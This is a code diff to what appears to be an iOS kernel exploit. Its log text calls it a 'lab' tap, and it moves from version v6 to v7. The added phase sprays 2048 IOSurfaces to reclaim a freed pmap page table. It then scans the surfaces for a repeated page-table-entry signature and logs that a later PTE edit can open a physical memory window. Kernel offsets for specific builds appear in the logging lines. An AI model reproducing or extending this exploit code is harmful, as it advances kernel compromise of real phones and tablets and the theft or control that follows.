@@ -19,7 +19,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P084_BUILD @"p084-pmap-tte-puaf-v6"
+#define P084_BUILD @"p084-pmap-tte-puaf-v7-surface-reclaim"
 
 /* P007 convention: local mach_vm prototypes, no <mach/mach_vm.h> */
 typedef unsigned long long p084_vmaddr_t;
@@ -129,6 +129,8 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     L(@"in this lab — the 23G71 Ghidra pins below do not paste onto T8101 either way.");
     L(@"23G71 pins: remove 0xa4df188 enter 0xa4e21d8 tte_dealloc 0x9e27f34.");
     L(@"Both A14 23F77 and A12X 23G71 run this tap; no reclaim claim from prose.");
+    L(@"v7 knob: Documents/p084_surface_reclaim.txt adds a 2048-surface IOSurface");
+    L(@"spray and looks for a repeated-PTE (user-mapped page table) signature. Read-only.");
     L(@"PANIC POSSIBLE - one tap per fresh boot.");
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p084"];
     if (stop) {
@@ -150,6 +152,7 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     /* function-scope state shared by C3 / Phase E / VERDICT */
     int spread = p084_mass ? 0 : 2048;
     int p084_reclaimHits = 0;   /* C3 faults+changed, plus any Phase E release */
+    NSMutableArray *p084_surfaces = nil;  /* v7 D2 IOSurface spray (ARC strong) */
 
     /* ---- IOSurface dlopen+dlsym (LightSwordCalib pattern: framework is not
        loaded until something pulls it in — RTLD_DEFAULT alone fails) ---- */
@@ -290,6 +293,57 @@ after_unmap: ;
                page keeps its PTE VALUES, so survivors keep reading our fill
                until the frame is REUSED. The reuse discriminator is below. */
             L(@"[C0] survivor[0] still our fill (expected under both hypotheses — see churn discriminator)");
+        }
+    }
+
+    /* ---- PHASE D2 (v7): IOSurface reclaim + repeated-PTE signature.
+       The freed pmap page table has 2,048 PTEs all pointing at the same
+       victim surface page — a page full of the SAME valid 8-byte value.
+       An IOSurface spray that reclaims that page without zeroing it exposes
+       the signature at the surface base. Read-only: no PTE is edited here. ---- */
+    BOOL p084_surfaceReclaim = [[NSFileManager defaultManager] fileExistsAtPath:
+        [docs stringByAppendingPathComponent:@"p084_surface_reclaim.txt"]];
+    if (p084_surfaceReclaim) {
+        p084_surfaces = [NSMutableArray array];
+        const int N = 2048;
+        for (int i = 0; i < N; i++) {
+            void *s = surfCreate((__bridge CFDictionaryRef)@{
+                @"IOSurfaceAllocSize": @(P084_PAGE),
+            });
+            if (!s) break;
+            [p084_surfaces addObject:(__bridge_transfer id)s];
+        }
+        int sig = 0, sigIdx = -1, maxReps = 0;
+        uint64_t sigVal = 0;
+        for (NSUInteger i = 0; i < p084_surfaces.count; i++) {
+            void *b = surfBase((__bridge void *)p084_surfaces[i]);
+            if (!b) continue;
+            uint64_t first = 0;
+            int reps = 0;
+            for (int j = 0; j < (int)(P084_PAGE / 8); j++) {
+                uint64_t v;
+                memcpy(&v, (uint8_t *)b + j * 8, 8);
+                if ((v & 1) == 0) continue;          /* valid PTE bit */
+                if (first == 0) { first = v; reps = 1; }
+                else if (v == first) reps++;
+            }
+            if (reps > maxReps) maxReps = reps;
+            if (reps >= 1024) {
+                sig++;
+                if (sigIdx < 0) { sigIdx = (int)i; sigVal = first; }
+            }
+        }
+        L([NSString stringWithFormat:@"[D2] IOSurface spray n=%lu signature_surfaces=%d max_reps=%d",
+            (unsigned long)p084_surfaces.count, sig, maxReps]);
+        if (sig > 0) {
+            uint64_t pa = sigVal & 0x0000FFFFFFFFC000ULL;
+            L([NSString stringWithFormat:@"[**] SURFACE PAGE-TABLE SIGNATURE: surface[%d] repeated=0x%llx reps=%d pa=0x%llx",
+                sigIdx, (unsigned long long)sigVal, maxReps, (unsigned long long)pa]);
+            L(@"[**] The freed pmap page table is user-mapped through the surface. "
+              @"A v3 PTE edit can turn this into a physical window. NOT hasKread yet.");
+        } else {
+            L(@"[-] no repeated-PTE surface. The freed pmap page was not reclaimed as a "
+              @"data page, or it was zeroed on allocation. This is the A12X result reproduced.");
         }
     }
 
